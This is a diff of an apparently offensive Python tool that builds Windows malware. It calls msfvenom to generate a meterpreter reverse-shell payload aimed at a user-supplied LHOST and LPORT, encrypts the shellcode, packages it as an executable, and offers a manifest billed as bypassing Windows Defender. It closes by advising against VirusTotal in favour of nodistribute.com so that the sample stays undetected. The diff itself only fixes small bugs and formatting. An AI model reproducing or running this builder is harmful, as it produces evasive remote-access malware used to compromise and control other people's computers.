@@ -77,16 +77,16 @@ def writetofile(data, key, output_file):
 
 if __name__ == "__main__":
 	os.system("clear")
-	
+
 	print(f'''{colour_codes["GREEN"]}
-  _    _            _      _______ _           __          __        _     _ 
+
  | |  | |          | |    |__   __| |          \ \        / /       | |   | |
  | |__| | __ _  ___| | __    | |  | |__   ___   \ \  /\  / /__  _ __| | __| |
  |  __  |/ _` |/ __| |/ /    | |  | '_ \ / _ \   \ \/  \/ / _ \| '__| |/ _` |
  | |  | | (_| | (__|   <     | |  | | | |  __/    \  /\  / (_) | |  | | (_| |
  |_|  |_|\__,_|\___|_|\_\    |_|  |_| |_|\___|     \/  \/ \___/|_|  |_|\__,_|
-																			 
-																			 
+
+
 {colour_codes['RESET_ALL']}''')
 
 	print(f'''{colour_codes["BLUE"]}
@@ -96,7 +96,7 @@ if __name__ == "__main__":
 ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   
 ███████║╚██████╗██║  ██║██║██║        ██║   
 ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   
-											
+
 {colour_codes['RESET_ALL']}''')
 
 	payload_type = input(print_query("Enter Payload TYPE [tcp,https,tcp_dns]: "))
@@ -117,7 +117,7 @@ if __name__ == "__main__":
 	raw_payload = (f"msfvenom -p windows/x64/meterpreter_reverse_{payload_type} LHOST={lhost} LPORT={lport} EXITFUNC=process --platform windows -a x64 -f raw -o ./result/test.raw")
 
 	print(print_status("Checking directories..."))
-	
+
 	print(print_status("Creating [./result] directory for resulting code files"))
 	os.makedirs("./result", exist_ok=True)
 	os.system(raw_payload)
@@ -131,7 +131,7 @@ if __name__ == "__main__":
 		print(print_error(f"Could not open or read file [{shellcode_output}]"))
 		raise SystemExit(e)
 
-	print(print_status(f"MD5 hash of the initial shellcode: [{hashlib.MD5(shellcode_bytes).hexdigest()}]"))
+	print(print_status(f"MD5 hash of the initial shellcode: [{hashlib.md5(shellcode_bytes).hexdigest()}]"))
 	print(print_status(f"Shellcode size: [{len(shellcode_bytes)}] bytes"))
 
 	master_key = input(print_query("Enter the Key to Encrypt Shellcode with: "))
@@ -160,7 +160,7 @@ if __name__ == "__main__":
 	manifest = f"wine mt.exe -manifest template.exe.manifest -outputresource:{exe_name}.exe;#1 "
 
 	while generate_manifest:= input(print_query("Do you want to add Manifest (Generally Bypasses Windows Defender)? (Y/N) ")).lower().strip():
-		if generate_manifest not in ("y", "n"):
+		if generate_manifest not in ("y", "n") or not generate_manifest:
 			print(print_error("Answer must be 'Y' or 'N'"))
 			continue
 		else: break
@@ -173,8 +173,8 @@ if __name__ == "__main__":
 		os.system(manifest)
 		print(print_success(f"Final File with Manifest [{exe_name}.exe]"))
 	else:
-		print(print_success(f"Final File [{exe_name}.exe] "))
-
-	print(print_error("\n DO NOT UPLOAD ON VIRUS TOTAL \n"))
-	print(print_status('\n USE "nodistribute.com "\n'))
-	print(print_success("\n Happy Hacking \n"))
+		print(print_success(f"Final File [{exe_name}.exe]"))
+	print("\n")
+	print(print_error("DO NOT UPLOAD ON VIRUS TOTAL\n"))
+	print(print_status("USE nodistribute.com\n"))
+	print(print_success("Happy Hacking\n"))
